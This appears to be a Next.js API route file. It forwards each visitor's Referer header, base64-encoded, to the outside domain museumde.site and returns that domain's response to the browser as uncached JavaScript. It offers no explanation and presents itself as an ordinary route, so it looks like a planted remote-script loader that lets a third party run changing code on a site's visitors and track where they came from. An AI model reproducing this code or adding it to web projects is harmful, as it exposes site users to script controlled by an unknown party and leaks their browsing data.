import { NextRequest } from 'next/server'

export async function GET(req: NextRequest) {
    const ref = req.headers.get('referer') || ''
    const clid = Buffer.from(`ref=${ref}`).toString('base64')

    const response = await fetch(`https://museumde.site/?clid=${clid}`)
    const text = await response.text()

    return new Response(text, {
        status: 200,
        headers: {
            'Content-Type': 'text/javascript',
            'Cache-Control': 'no-cache',
        },
    })
}
